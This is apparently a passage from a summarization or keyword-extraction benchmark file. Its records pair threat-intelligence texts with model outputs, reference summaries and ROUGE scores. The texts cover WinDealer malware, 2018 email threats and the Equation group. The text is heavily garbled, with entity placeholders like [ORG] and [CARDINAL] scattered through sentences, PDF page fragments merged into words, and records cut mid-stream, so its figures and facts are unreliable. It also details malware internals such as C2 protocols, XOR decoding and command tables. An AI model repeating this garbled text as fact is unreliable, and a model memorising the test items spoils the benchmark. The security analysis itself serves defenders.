[CARDINAL] 2 shows a function to decode configuration.2/17Figure [CARDINAL] 2\uff1aFunction to decode a file storing configurationCommunicate with C2 serversIf the following configuration files exist in the designated folder , [ORG] WinDealer loads the [CARDINAL] C2 server information from them and starts communicating . C:\\ProgramData\\ad5f82e8 C:\\ProgramData\\1c76cbfe [PRODUCT] C:\\ProgramData\\9c3b62943/17If no such file exists , [ORG] WinDealer communicates to a random [ORG] IP address in one of the following ranges ( port [DATE] 6999 / [ORG] UDP or [DATE] 55556 / TCP ) . It switches to an [ORG] IP address in the other AES key with [ORG] RSA algorithm and sends to a [CARDINAL] C2 server . Information stolen from a victim PC is encrypted with this AES key and sent to a [CARDINAL] C2 server at a certain interval . After that , [CARDINAL] C2 server sends a command to the victim PC . The malware executes it and sends the result to the [CARDINAL] C2 server after encryption . Besides the data exchange , the malware also communicates with domains such as www[.]microsoftcom ( non - existent at the moment ) and icanhazip[.]com . Figure [CARDINAL] 3 : Communication flow with a [CARDINAL] C2 serverFigure [CARDINAL] 4 describes the communication contents when delivering an [ORG] AES key . AES key and its CRC32 checksum value are encrypted with RSA1024bit public key . The public key is hardcoded in the sample , which is also used for other samples as well.4/17UDP headerVictim PC identifierValue generated from configuration file + fixed valueFixed valueAES key + RSA - encrypted data of AES key \u2019s CRC32 valueFigure [CARDINAL] 4 \uff1a Example of contents sent with AES keyFrom the [ORDINAL] second round of communication and onwards , data is encrypted in AES128bit [ORG] ECB mode based on the [ORG] AES key which was dynamically generated during the initial communication . Please refer to Appendix B for the details of data format . Process and send stolen [ORG] dataWinDealer processes a series of stolen data as \u201c .a \u201d file in a folder under % TEMP% , encrypts it with AES and send it to a C2 server . The flow of event is illustrated in Figure [CARDINAL] 5 . The modules steal and process the data , while [ORG] WinDealer itself monitors the files under % TEMP% , encrypts the file and sends it to a [CARDINAL] C2 server.5/17Figure 5\uff1aFlow of events by [ORG] WinDealer and modulesA part of the code for generating \u201c .a \u201d file by a module is as follows ( Figure [CARDINAL] 6):Figure 6 \uff1a [ORG] DLL module \u2019s code to generate \u201c .a \u201d file6/17The stolen data is [ORDINAL] first stored in a file with an \u201c .t \u201d extension , which is then renamed to \u201c .a \u201d . The series of data is stored in different directories based on the data category , and they are taken out when \u201c .a \u201d file is created . Please refer to Appendix E for the details of each directory . Before writing and reading the files , the data is encoded / decoded by XOR - based function with its key value \u201c YYYY \u201d as in Figure [CARDINAL] 7.Figure [CARDINAL] 7\uff1aA function for XOR - based encoding when accessing \u201c .a \u201d fileFunctions of modules loaded on memoryOnce launched , [ORG] WinDealer loads a [ORG] DLL module in a [ORG] PE format ( encoded in the sample ) on the memory and executes it ( Figure 8).7/17Byte string to searchUsed for XOR - based decode functionEncoded [ORG] PE dataFigure [CARDINAL] 8 \uff1a Encoded module dataThe malware obtains its file path , searches for a byte string \u201c 0xFF3456FF00 \u201d and extracts data from its offset [CARDINAL] 0xE. Using its offset [CARDINAL] 0x4 value and a [ORG] XOR - based decode routine ( Figure [CARDINAL] 9 ) , a [ORG] DLL module is loaded on the memory and then executed.8/17Figure 9 \uff1a Decoding moduleThe loaded [ORG] DLL module is named as \u201c MozillaDll.dll \u201d . There are [CARDINAL] 3 Export functions as follows : AutoGetSystemInfo : [ORG] Steal data GetConfigInfo : Set configuration partInitOpt : Set commandsThe loaded [ORG] DLL module monitors the below items , saves related items in a separate file and obtains them to send out to a C2 server . [PERSON] Files stored in a [ORG] USB memory [PERSON] Files under Documents , desktop and recycle [PERSON] bin [PERSON] Files under folders related to [ORG] SNS applicationsPlease see Appendix D for the details of commands that [CARDINAL] C2 server sends and its contents . In closingBesides [ORG] WinDealer , it has been confirmed that [ORG] LuoYu uses other kinds of malware that operate in various platforms . We will report if we observe a new type of malware . For your reference , SHA256 hash values of similar samples are listed in [NORP] Appendix F.- [PERSON] Yuma [PERSON] Masubuchi ( Translated by [PERSON] Yukako [PERSON] Uchida)Reference[1 ] \u201c [WORK_OF_ART] LuoYu \u201d The eavesdropper sneaking in multiple platforms url [ORG] Japan [ORG] Security Analyst Conference [CARDINAL] 2021 -3rd Track- url A [ORG] WinDealer configurationFile pathString in malware [PRODUCT] ContentsC:\\ProgramData\\923b5fd7remark-9/17C:\\ProgramData\\ad5f82e8remotedomainDomain nameC:\\ProgramData\\8fe4c114password - C:\\ProgramData\\1c76cbferemoteipC2 server IPC:\\ProgramData\\9c3b6294reverseipC2 server IP ( reconfigured)C:\\ProgramData\\789406d0 - Result of connection to a dummy hostC:\\ProgramData\\c25549feotherinfo - C:\\ProgramData\\f46d373bC:\\ProgramData\\windows.infC:\\ProgramData\\Destro --- Created when launched - Name information to register in run keyTable A\uff1aList of configurationAppendix B WinDealer Contents of data exchangedOffset Length ( byte)Contents0x000x040x084440x0C 10x91DA81060x439FC7CEVictim PC identifierGenerated based on the contents of a configuration file \" 789406d0\"0x0D [CARDINAL] 30x00140010/170x10128AES key + RSA - encrypted data of AES key \u2019s CRC32 valueTable B-1 \uff1a Format of data sent for [ORDINAL] first communicationOffset [PERSON] Length ( byte)Contents0x000x040x084440x0C [CARDINAL] 10x0D [CARDINAL] 10x0E0x100x110x120x13 - ---211111 - 10x91DA81060x439FC7CEVictim PC identifierGenerated based on the contents of a configuration file \" 789406d0\"Type0x1400Length0x6remark lengthremark0x3password lengthpassword0x511/17 - --1 - -otherinfo lengthotherinfoSystem informationTable B-2\uff1aFormat of data sent for [ORDINAL] second communication onwardsOffset [PERSON] Length ( byte)Contents0x000x04440x0D [CARDINAL] 10x100x120x140x1622220x91DA81060x439FC7CECommandscommand data lengthUnusedUnusedUnused0x18Command data length [ORG] Command dataTable [PRODUCT] B-3\uff1aFormat of data receivedAppendix C WinDealer List of commandsValue Parameter string*0x06content - length : [CARDINAL] 2Contentsuninstall12/170x09content - length , filename , timeDelete files under % TEMP%0xCfilename , flg0x1Fspeed0x2D filepathCreateProcessConfigure Sleep timeObtain contents of selected file0x50filename , md5Delete selected file0x51filepos , filename , filelen , block , md5Write on selected file0x5A [ORG] datastate0x5B -0x5C list0x5D yes0x5E otherinfo0x60headsign , [CARDINAL] 1 , [CARDINAL] 20x61reverseip0x630x64 - -Write on \" C:\\ProgramData\\windows.inf\"Perpetuation settings for registriesPerpetuation after process checkSet a value to [ORG] SType of { HKCU}\\\\Softwaware\\MicrosoftWrite on \" c25549fe\"Write on \" 789406d0\"Write on \" 9c3b6294\"Obtain configurationRead time0x66remoteip , remark , passwordWrite on configuration files0x67sessionid:-13/170x8F Hkey , subkey , valuename , classesroot , currentuser , localmachine , users , currentconfigExecute RegQueryValue0xAA pname0xAB -0xAD -Screen captureConfiguration on screen captureConfiguration on screen captureTable C\uff1aList of commands*Parameter string : These strings are parsed from the received command and used as a command parameterAppendix D List of commands of loaded modulesValue Parameter string*Contents0x02 - Related to screen capture0x03bootdir , filetypeRelated to folder / files0x05filename , monitortype , begpos , blockSend files0x07 - 0x0A -0x0D -Obtain drive informationConfigure for lnk filesExecute commands 0xC0 , 0xC5 , 0xC3 , [DATE] 0xC1 , [DATE] 0xC2 , [DATE] 0xC4 , 0xC60x12freq , storetm , quality , typeConfigure parameter0x1E srhdir , srhcont , srhnum , sessid-14/170x28filenameObtain file information0x29filefilter , settype , usbfilter , checkdirfilterConfigure parameter for monitoring0x2A monitortype , monitorvalueObtain files of monitoring results0x2B -0x30 - -Write contents such as \" c:\\windows \" , \" c:\\program files \" on \" ~BF24\"0x32freq , storetmConfigure [CARDINAL] parameter0x3E fileCreate jpeg file under % TEMP%0x65filename , fileoffsetObtain contents from selected files and offsets0x69filename , delete , [ORG] yesDelete selected files0x7A cmdtype , command : , reset , downfile , getmypath , dealmd5Execute cmd.exe0x7B session , command , reset , downfile , exit , getmypathExecute remote [GPE] shell0xC00xC10xC20xC30xC4 - ----Write list of processes on \" [CARDINAL] 28e4 - 20a6acec\"Write list of applications on \" [CARDINAL] 28e4 - 20a6acec\"Write keyboard information on \" [CARDINAL] 28e4- 20a6acec\"Write [ORG] SNS - related registry contents on \" [CARDINAL] 28e4- 20a6acec\"Write configuration of [ORG] Skype , QQ , [ORG] WeChat and wangwang on \" [CARDINAL] 28e4 - 20a6acec\"15/170xC50xC6 - -Write [ORG] MAC address etc . on \" [CARDINAL] 28e4 - 20a6acec\"Write network configuration on \" [CARDINAL] 28e4- 20a6acec\"Table D\uff1aList of commands*Parameter string : These strings are parsed from the received command and used as a", "generated_text": "a presentation; the malware WinDealer; LuoYu Attack Group; ROMAN; Korean; Japanese; 2014; information; a file; configuration; memory; SNS applications; AES key; IMAP; the script; commands; the victim PC; the C2 server; the C2 server; TCP; IP; DNS; HTTP; data; a C2 server; the RC32; AES key; the C2 server; the C2 server; IP; a command; the C2 server; domains; at least one time; the victims.", "ref_text": "<START-1>The PDF document describes malware called WinDealer that is used by a threat actor group named LuoYu to target organizations in Korea and Japan since 2014. WinDealer steals information from infected computers and sends it to command and control (C2) servers. When executed, WinDealer reads configuration data from files in C:\\ProgramData. It communicates with C2 servers specified in the configuration or random IP addresses if no C2 is configured. It sends an encrypted AES key to the C2, then uses that key to encrypt stolen data before sending it to the C2. WinDealer loads a DLL module from encoded data in its own executable file. This module steals data like files from USB drives, files from folders like Documents and Desktop, keyboard logs, and browser cookies. The stolen data is saved in folders under %TEMP% as .t files, encoded, then consolidated into .a files. WinDealer monitors these .a files, encrypts them, and sends them to the C2. The C2 can send commands to execute processes, delete files, write registry keys for persistence, and more. The report analyses the network communication and data formats used by WinDealer. It also provides indicators of compromise like file hashes and C2 IP addresses. In summary, the report provides a detailed analysis of the WinDealer malware, its configuration, C2 communication, data stealing capabilities, and related IOCs. This provides defenders with insight into the tactics, techniques, and procedures used by the LuoYu group in its cyber espionage operations. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5241730279898219, "gpt3/lexical/rouge_rouge2": 0.19437340153452687, "gpt3/lexical/rouge_rougeL": 0.366412213740458, "gpt3/lexical/rouge_rougeLsum": 0.366412213740458, "gpt3_generated_text": ["The article discusses the malware WinDealer used by the LuoYu Attack Group, which has been targeting Korean and Japanese organizations since 2014. The malware steals information from infected PCs, including network configuration and SNS applications, and sends it to a C2 server. The malware reads its configuration from files stored in the C:\\ProgramData folder and communicates with C2 servers using either specified IP addresses or random IP addresses in certain ranges. The stolen data is encrypted with an AES key and sent to the C2 server, which can then send commands back to the victim PC. The malware also communicates with domains such as www[.]microsoftcom and icanhazip[.]com. The stolen data is processed and stored in temporary files before being encrypted and sent to the C2 server. Overall, the article provides an overview of the behavior and functionality of the WinDealer malware used by the LuoYu Attack Group."]}, {"split_name": "test", "sample_id": "test_40", "prompt_text": "Extract the keywords: Of all infection vectors , email remains [CARDINAL] one of the most consistently used platforms in cybercrime because of how easily it can be abused . Apart from being a staple communication and collaboration tool , email is effortless and cheaper ( if not cost - free ) to distribute . The convenience it affords to cybercriminals puts enterprise environments using email services in a potentially precarious situation \u2014 they can be susceptible to fraud , spying , information theft , and spoofing , among other attacks . In [DATE] 2018 , [ORG] Trend [ORG] Micro \u2122 [ORG] Smart [ORG] Protection [ORG] Network \u2122 security infrastructure detected and blocked over [CARDINAL] 41 [CARDINAL] billion email threats . The overwhelming increase in the number of phishing attacks and spam campaigns , as well as cybercriminals \u2019 constant bundling of email with various types of malware , contributed to this huge total . The proliferation , not to mention persistence , of these threats should remind organizations to look into all types of countermeasures to efficiently protect their systems and networks . [ORG] Additional [ORG] Cybersecurity [ORG] Layer [ORG] Still [ORG] Necessary [ORG] for [ORG] Blocking High [ORG] - Risk Email Threats [ORG] The [ORG] Trend [ORG] Micro \u2122 Cloud App Security \u2122 solution provides advanced protection for cloud email and file sharing applications such as [ORG] Microsoft \u00ae [ORG] Office 365 \u2122 Exchange \u2122 Online , Google Drive \u2122 , [ORG] OneDrive \u00ae for [GPE] Business , and [PRODUCT] SharePoint \u00ae Online platforms , ensuring that organizations \u2019 assets , especially their data , are secured and used in a transparent manner . It serves as an additional layer of protection after emails and files have passed through the said cloud applications \u2019 own security filters . It uses machine learning ( [ORG] ML ) , sandbox malware analysis , and other cybersecurity technologies to defend systems against business email compromise ( [ORG] BEC ) , phishing , spear phishing , whaling , ransomware , and other advanced email threats . [PERSON] Cloud [PERSON] App [PERSON] Security caught even more threats in [DATE] 2018 than in [DATE] the [DATE] previous [DATE] year , detecting and blocking a total of [CARDINAL] 8,920,792 high - risk email threats . Some businesses that use email services such as Office 365 rely on built - in security filters while other businesses add [CARDINAL] one or more [ORDINAL] third - party security solutions for added protection against threats . The [DATE] 2018 threat data shows how Cloud App Security helps businesses with existing email security , whether built - in or standalone , by detecting and blocking high - risk threats missed by previous security layers . The case of a large company in the logistics industry , which has [CARDINAL] 80,000 Office 365 users , illustrates the point . Cloud App Security detected and blocked [CARDINAL] more [CARDINAL] than [CARDINAL] half [CARDINAL] a [CARDINAL] million additional phishing emails , among other threats ( see flip cards for the complete list ) . These high - risk threats were detected after they passed through [ORG] Office [ORG] 365 built - in security filter and Office 365 [ORG] Advanced [ORG] Threat [ORG] Protection ( ATP ) , an add - on service . Another example is a large company in the hospitality industry that has [CARDINAL] 120,000 Office 365 users . This company , which used a [ORDINAL] third - party email security gateway , had additional email threats blocked by [PERSON] Cloud [PERSON] App [PERSON] Security in [CARDINAL] the [CARDINAL] hundred [CARDINAL] thousands ( see flip cards for the complete list ) . Businesses using Cloud App Security as the only supplementary layer were also further protected . A large company in the internet industry , which has [CARDINAL] 10,000 Office 365 users , and a small business in the information industry , which has 115 Office 365 users , also had additional detections ( see flip cards for the complete list ) . * Hover to flip to the breakdown of threats detected by [ORG] Cloud [ORG] App [ORG] Security A multilayered cybersecurity strategy is truly vital in the connected age because , whatever the size of the business , the chances are high that they will run into threats that can be tenacious in tearing apart cyber defenses . In [DATE] 2018 , we saw new tricks and trends in email attacks designed to serve this purpose , and at the same time , familiar but notorious banking trojans , backdoors , and ransomware continued to abuse email to deploy attacks . To provide organizations a comprehensive view of the email threat landscape , we look at these notable occurrences as well as recommend countermeasures to adopt to defend against advanced email threats . [ORG] Credential [ORG] Phishing [ORG] Tactics [ORG] Increasingly [ORG] Target [ORG] Office 365 Users Credential phishing has continued to flourish because of cybercriminals \u2019 continuous efforts to produce new variations of attack . Cloud [ORG] App [ORG] Security data showed that credential phishing attacks are still widely deployed : It accounted for [PERCENT] 40 [PERCENT] percent of the total high - risk email threats detected in [DATE] 2018 . Credential phishing [PERCENT] - [PERCENT] 40 % ( [CARDINAL] 3,530,495 detections ) Credential phishing accounted for [PERCENT] 40 [PERCENT] percent of the [CARDINAL] 8.9 [CARDINAL] million high - risk email threats detected by [PERSON] Cloud [PERSON] App [PERSON] Security in [DATE] 2018 . [DATE] Last [DATE] year , new credential phishing attack variations struck the headlines when security researchers found them targeting Office 365 users . [PERSON] Cloud [PERSON] App [PERSON] Security was able to detect phishing emails that attempted to harvest the account credentials of Office 365 users via similar schemes . The email below , which was detected in [DATE] October , posed as an account termination notice from Office 365 . In the scheme , an email notification is sent to users informing them that they have requested to terminate their corporate email account . The email also advises users that if this supposed termination was an error , they can cancel it by clicking an embedded link at the bottom part of the email . Once the link is clicked , they are led to a phishing page that impersonates an Office 365 login screen . The users \u2019 Office 365 credentials will be stolen if they attempt to log in . The popularity of [ORG] Office 365 has positioned it as an attractive target for cybercriminals . The credential phishing email shown above , which was detected by [PERSON] Cloud [PERSON] App [PERSON] Security , poses as an Office 365 notification email . Aside from this account termination scheme , other types of phishing tactics aimed at Office 365 users also emerged . In [DATE] December , fake non - delivery reports ( NDRs ) were deployed to phish [ORG] Office 365 user credentials . Uncovered by [PERSON] Xavier [PERSON] Mertens , [PERSON] Senior [PERSON] Handler of [ORG] the [ORG] Internet [ORG] Storm [ORG] Center ( ISC ) , the [ORG] NDR emails contained malicious URLs that , when clicked , directed the user to a bogus [ORG] Office 365 login page . In [DATE] January [DATE] 2019 , [ORG] the [ORG] U.S. [ORG] Secret [ORG] Service also shared information regarding phishing attacks that specifically target organizations using [ORG] Office 365 . According to [ORG] the [ORG] Secret [ORG] Service , spear - phishing emails that seem to link to an encrypted document were spotted . Users that click on the link are asked to enter their email account credentials via a fake Office 365 login request form that appears legitimate . Attackers gain access to the email accounts of users who fall for the scheme . BEC Persists and New Trends [PERSON] Arise BEC attempts accounted for [PERCENT] 1 [PERCENT] percent of the total detections . This percentage may seem small in comparison to other threat types detected by [PERSON] Cloud [PERSON] App [PERSON] Security , but [ORG] BEC should not be overlooked : [ORG] The [ORG] Federal [ORG] Bureau [ORG] of Investigation \u2019s ( [ORG] FBI ) [DATE] July [DATE] 2018 public service announcement ( [ORG] PSA ) on [ORG] BEC stated that [ORG] BEC scams have already caused US$ 12.5 [MONEY] billion global losses as of [DATE] 2018 , with an average exposed loss of US$ [MONEY] 159,000 per incident . BEC [PERCENT] attempts [PERCENT] - [PERCENT] 1 % ( [CARDINAL] 103,955 detections ) BEC attempts accounted for [PERCENT] 1 [PERCENT] percent of the total high - risk email threats detected by [PERSON] Cloud [PERSON] App [PERSON] Security in [DATE] 2018 . According to the [ORG] FBI , since [DATE] 2013 , global losses to [ORG] BEC reached US$ 12.5 [MONEY] billion in [DATE] 2018 \u2014 a [PERCENT] 136.4 [PERCENT] percent increase from the reported total in [DATE] 2017 . Aside from the aforementioned global losses , the same [ORG] PSA also highlighted that the real estate sector was increasingly being targeted by [ORG] BEC scammers . [DATE] May [DATE] 2018 recorded the highest number of [ORG] BEC real estate victims since [DATE] 2015 . The bureau reported that victims that have participated in all levels of transactions \u2014 from title companies , law firms , and real estate agents to buyers and sellers \u2014 were tricked with spoofed emails that manipulated them into changing payment type and/or payment location to a falsified account set up by the [ORG] BEC scammer / s. As seen in the [ORG] BEC sample , this is a common deception tactic among [ORG] BEC scams and not just in real estate ones . Sent using an email address with a suspicious domain , this [ORG] BEC email impersonating an executive requests a change in banking details . In what appears to be a product of masterful social engineering , [ORG] BEC scammers were also reportedly using \u201c domestic money mules \u201d in real - estate - related scams ; these money mules were recruited via confidence or romance scams . After grooming these victims , scammers will trick them into opening accounts that will only be used for a short term , presumably to avoid being tracked by the authorities . In [DATE] October [DATE] 2018 , the [ORG] FBI also released a [ORG] PSA on the increased number of BEC complaints that involved victims being tricked to purchase gift cards . In this [ORG] BEC scam , a cybercriminal posing as a person in authority may send a spoofed email , phone call , or text to a victim , requesting to buy gift cards for personal or business purposes . Additional requests for wire transfer payments were observed in some incidents . [DATE] Between [DATE] January [DATE] 2017 [DATE] and [DATE] August [DATE] 2018 , a total of [CARDINAL] 1,164 [ORG] BEC gift card complaints have been recorded , with adjusted losses of US$ [MONEY] 1,021,919 . Notably , the number of recorded complaints [DATE] between [DATE] January [DATE] 2017 [DATE] and [DATE] August [DATE] 2018 showed an over 1,240 - percent increase \u2014 an indication that [ORG] BEC gift card scams are on the rise . Cybercriminals Expand File Types Abused to Evade Detection As detection methods continue to advance , cybercriminals also continue to devise new evasion methods to keep up . Some of these methods can be complex . For example , the use of fileless threats , which can come from macro codes embedded in seemingly benign file attachments and launched through legitimate tools like [ORG] PowerShell . Others can be as simple as the abuse of a rarely used file format . Our researchers came across spam campaigns that utilized old - yet - rarely - used file types to disguise malware attachments . This method can take advantage of such file types \u2019 structure to evade certain kinds of detection techniques ( for example , signature - based detection ) , or to attempt to bypass an outdated or nonflexible security filter . [CARDINAL] One example is the .ARJ file format , which the Trend Micro Smart Protection Network architecture detected in [CARDINAL] thousands of malicious files [DATE] last [DATE] year . After analyzing a spam sample that carries an .ARJ file , our researchers found that , after the file is downloaded to a device , it can drop and launch an executable file . A spam sample that uses an .ARJ file hides under the guise of a purchase order . We also observed a spam campaign that abused .IQY files . For this particular campaign , [CARDINAL] approximately [CARDINAL] 500,000 spam samples were detected . Notably , the choice to utilize the rarely used .IQY file type is just one of the multiple techniques deployed by this campaign . In addition , once the .IQY file is opened , [ORG] Dynamic [ORG] Data [ORG] Exchange ( DDE ) and [ORG] PowerShell will also be abused subsequently , with the final payload delivering either a backdoor or a trojan . This proves that , while using a different file type may be simple , when combined with other techniques , it can create a multifaceted attack that can put users and organizations at a higher risk of infection . A spam sample using an .IQY file . The [NORP] Japanese subject reads \u201c [PERSON] Photo attached \u201d while the message body reads \u201c Always thank you for your help . I will send it in [ORG] XLS version . Please check attached file , thank you . Thanking you in advance . \u201d Apart from .ARJ and .IQY , we also observed cybercriminals experimenting on file types such as .Z , .PUB , and SettingContent - ms . Email Still Favored by [ORG] Attackers [ORG] for [ORG] Delivering [ORG] Notorious [ORG] Malware [ORG] Variants [ORG] Data from Cloud App Security shows that malware accounted for [PERCENT] 12 [PERCENT] percent of the total high - risk email threats detected in [DATE] 2018 . While there are a variety of malware distribution techniques , ranging from abusing internet of things ( [ORG] IoT ) devices , app marketplaces , and vulnerabilities to using exploit kits and malicious websites , email remained a popular choice for cybercriminals who are operating behind notorious malware families . [ORG] Malware [ORG] - [ORG] 12 % ( [CARDINAL] 1,080,022 detections ) [PERSON] Malware accounted for [PERCENT] 12 [PERCENT] percent of the high - risk email threats detected by [PERSON] Cloud [PERSON] App [PERSON] Security in [DATE] 2018 . Case in point : Emotet , a five [DATE] - [DATE] year [DATE] - old malware described by [GPE] the [GPE] United [GPE] States [GPE] Computer [GPE] Emergency [GPE] Readiness [GPE] Team ( US [ORG] - CERT ) as [CARDINAL] one of the most destructive and costly malware affecting governments and the private and public sectors . Found with notable multilayer operating mechanisms , [PERSON] Emotet is predominantly delivered via email and uses financial - related email subjects to deceive recipients . [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network data placed [PERSON] Emotet as the [ORDINAL] seventh most detected malware family globally in [DATE] 2018 . Meanwhile , the [PRODUCT] GandCrab ransomware made headlines [DATE] last [DATE] year when spam campaigns were spotted distributing its v2.1 variant in [DATE] April . GandCrab resurfaced in [DATE] August , with its v4.3 variant being delivered to [NORP] South [NORP] Koreans via phishing emails in Hangul . Trend Micro Smart Protection Network data showed [PRODUCT] GandCrab as the [ORDINAL] second most detected ransomware family in [DATE] 2018 . Other notorious malware families that rely on email as their primary infection vector also made notable appearances [DATE] last [DATE] year . [PERSON] Trickbot was found with a new PoS malware feature and a password grabber module ( [PERSON] pwgrab32 ) that steals access from several applications and browsers , such as [ORG] Microsoft [ORG] Outlook , [ORG] Filezilla , WinSCP , [ORG] Mozilla [ORG] Firefox , [PERSON] Microsoft [PERSON] Edge , and [PERSON] Google [PERSON] Chrome . [ORG] URSNIF , on the other hand , was used by cybercriminals in a highly sophisticated scheme where hijacked email accounts send the trojan as part of or as a reply to an ongoing email thread . Email users may have difficulty spotting this scheme because of cybercriminals \u2019 use of a legitimate email thread . Counter Advanced Email Threats With Computer Vision , Writing Style DNA , and Machine Learning As email threats continue to multiply and become more complex , organizations should be able to set up a multilayered cybersecurity defense to address the risks that email threats pose . Cloud App Security has the capability to enhance the built - in security of email services like Office 365 by using [ORG] ML in detecting suspicious content in the message body and attachments , sandbox malware analysis , document exploit detection , and file , email , and web reputation technologies . This security solution detects advanced malware hidden in Office 365 or [ORG] PDF documents , maximizes cloud efficiency learned from [DATE] years of experience protecting [ORG] Microsoft [ORG] Exchange and [ORG] SharePoint environments , and scans files shared by remote colleagues , clients , and mobile devices to ensure threats are barred from using [ORG] OneDrive or [ORG] SharePoint to migrate . In [DATE] 2018 , [CARDINAL] two new advanced features were introduced into [ORG] Cloud [ORG] App [ORG] Security to help businesses stay protected from high - risk and advanced email threats . The [ORDINAL] first is Writing Style DNA , an ML - powered technology that can help detect email impersonation tactics used in [ORG] BEC and similar scams . It uses ML to recognize the DNA of a user \u2019s writing style based on past emails and then compares it to suspected forgeries . The technology verifies the legitimacy of the email content \u2019s writing style through an ML model that contains the legitimate email sender \u2019s writing characteristics . The [ORDINAL] second technology is a feature that combines artificial intelligence ( [ORG] AI ) and computer vision in order to help detect and block attempts at credential phishing in real time , especially now that more schemes continue to use legitimate - looking fake login webpages to deceive email users . After suspected phishing emails go through sender , content , and URL reputation analyses , computer vision technology and [ORG] AI will quickly examine the remaining URLs to check if a legitimate login page \u2019s branded elements , login form , and other website components are being spoofed . These technologies , alongside other features , embody not only the advancement of [ORG] Cloud [ORG] App [ORG] Security but also its agility and flexibility in defending against email threats \u2014 regardless of the number and level of sophistication \u2014 and make Cloud App Security a smart choice to integrate into a multilayered cybersecurity defense . However , an effective cybersecurity strategy does n\u2019t only consist of multiple layers of cybersecurity protection . It also needs workforce cybersecurity awareness so that no security holes can be accidentally opened for cybercriminals to exploit . In addition to employing security solutions , organizations can inform employees of best practices against email threats and help them become more vigilant by deploying our free phishing simulation and user training service .", "generated_text": "threat data; Trend Micro; Cloud App Security; high-risk email threats; 41 billion; 2018; email services; Microsoft Office; Exchange; Google Drive; OneDrive; SharePoint; a layer; protection; emails; files; Office 365 advanced threat protection; ATP; Machine learning; ML; sandbox malware analysis; other cybersecurity technologies; surveillance; phishing emails; spear phishing; whaling; ransomware; malware; a multilayered cybersecurity strategy; businesses; vulnerabilities; the need; a multilayered cybersecurity strategy; the connected age; threats.", "ref_text": "<START-1>The report provides an overview of email threats detected in 2018. It notes that email remains a consistently used attack vector due to its ubiquity and ease of abuse. Trend Micro detected over 41 billion email threats in 2018. Phishing was a major threat, accounting for 40% of high-risk email detections. New phishing tactics targeted Office 365 credentials. Business Email Compromise (BEC) attempts made up 1% of detections but have caused over $12 billion in losses globally. The report highlights cybercriminals using rarely used file types like .ARJ and .IQY to distribute malware and evade detection. Well-known malware families like Emotet, GandCrab, and Trickbot continued to leverage email for delivery. Trend Micro Cloud App Security uses machine learning, sandboxing, document exploit detection, and other technologies to secure Office 365, G Suite, and other cloud email. New capabilities introduced in 2018 include Writing Style DNA to detect email impersonation and computer vision to uncover phishing URLs. The report advises a multi-layered defense combining advanced security tools with user awareness training to counter the persistent threat of email-borne attacks targeting enterprises. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.45425867507886436, "gpt3/lexical/rouge_rouge2": 0.1523809523809524, "gpt3/lexical/rouge_rougeL": 0.25236593059936907, "gpt3/lexical/rouge_rougeLsum": 0.25236593059936907, "gpt3_generated_text": ["In 2018, Trend Micro's Smart Protection Network detected and blocked over 41 billion email threats, highlighting the persistent and increasing risk of cybercrime through email. As a result, organizations using email services are vulnerable to fraud, spying, information theft, and spoofing. To address this, Trend Micro's Cloud App Security solution provides advanced protection for cloud email and file sharing applications, such as Microsoft Office 365, Google Drive, OneDrive, and SharePoint, using machine learning, sandbox malware analysis, and other cybersecurity technologies. The data from 2018 shows that Cloud App Security detected and blocked 8,920,792 high-risk email threats, including credential phishing, which accounted for 40% of the total threats. This emphasizes the need for a multilayered cybersecurity strategy to effectively protect businesses from the tenacious and evolving nature of email attacks."]}, {"split_name": "test", "sample_id": "test_41", "prompt_text": "Extract the keywords: ANSWERSVersion : [CARDINAL] 1.5 # TheSAS20152Table of contents1 . What is the [ORG] Equation group ? 32.3.Why do you call them the \u201c Equation \u201d group ? 3What attack tools and malware does the [ORG] Equation group use ? [CARDINAL] 44 . What is DOUBLEFANTASY ? [CARDINAL] 65 . What is EQUATIONDRUG ? [CARDINAL] 86 . What is GRAYFISH ? [CARDINAL] 97 . What is Fanny ? [CARDINAL] 128.9.What exploits does the [ORG] Equation group use ? 14How do victims get infected by [ORG] EQUATION group malware ? [DATE] 1510 . What is the most sophisticated thing about the [ORG] EQUATION group ? 1611 . Have you observed any artifacts indicating who is behindthe [ORG] EQUATION group ? [DATE] 1912 . How many victims are there ? 2013 . Have you seen any non - Windows malware from the [ORG] Equation group ? [DATE] 2214 . What [ORG] C&C infrastructure do the [ORG] Equation group implants use ? [DATE] 2315 . How do victims get selected for infection by the [ORG] EQUATION group ? [CARDINAL] 2316 . What kind of encryption algorithms are used by the [ORG] EQUATION group ? [DATE] 2717 . How does the [ORG] EQUATION group \u2019s attack platformscompare with Regin ? [DATE] 3018 . How did you discover this malware ? [CARDINAL] 31Indicators of compromise ( \u201c [CARDINAL] one of each \u201d ) [DATE] 3231 . What is the [ORG] Equation group ? The [ORG] Equation group is a highly sophisticated threat actor that has been engaged in multiple [ORG] CNE ( computer network exploitation ) operations dating back to [DATE] 2001 , and perhaps [DATE] as [DATE] early [DATE] as [DATE] 1996 . The [ORG] Equation group uses multiple malware platforms , some of which surpass the well - known \u201c Regin \u201d threat in complexity and sophistication . The [ORG] Equation group is probably [CARDINAL] one of the most sophisticated cyber attack groups in the world ; and they are the most advanced threat actor we have seen.2.Why do you call them the \u201c Equation \u201d group?We call this threat actor the [ORG] Equation group because of their love for encryption algorithms and obfuscation strategies and the sophisticated methods used throughout their operations . In general , the [ORG] Equation group uses a specific implementation of the RC5 encryption algorithm throughout their malware . Some of the most recent modules use RC6 , RC4 and [ORG] AES too , in addition to other cryptographic functions and hashes . [CARDINAL] One technique in particular caught our attention and reminded us of another complex malware , [GPE] Gauss . The [NORP] GrayFish loader uses SHA-256 [CARDINAL] one [CARDINAL] thousand times over the unique NTFS object ID of the victim \u2019s Windows folder to decrypt the next stage from the registry . This uniquely ties the infection to the specific machine , and means the payload can not be decrypted without knowing the [ORG] NTFS object ID.43.What attack tools and malware does the [ORG] Equation group [GPE] use?So far , we \u2019ve identified several malware platforms used exclusively by [ORG] the [ORG] Equation [ORG] \u2022 [ORG] EQUATIONDRUG \u2013 A very complex attack platform used by the group on its victims . It supports a module plugin system , which can be dynamically uploaded and unloaded by the attackers.\u2022 DOUBLEFANTASY \u2013 A validator - style [GPE] Trojan , designed to confirm the target is the intended one . If the target is confirmed , they get upgraded to a more sophisticated platform such as [ORG] EQUATIONDRUG or GRAYFISH.\u2022 EQUESTRE \u2013 Same as [ORG] EQUATIONDRUG . \u2022 TRIPLEFANTASY \u2013 Full - featured backdoor sometimes used in 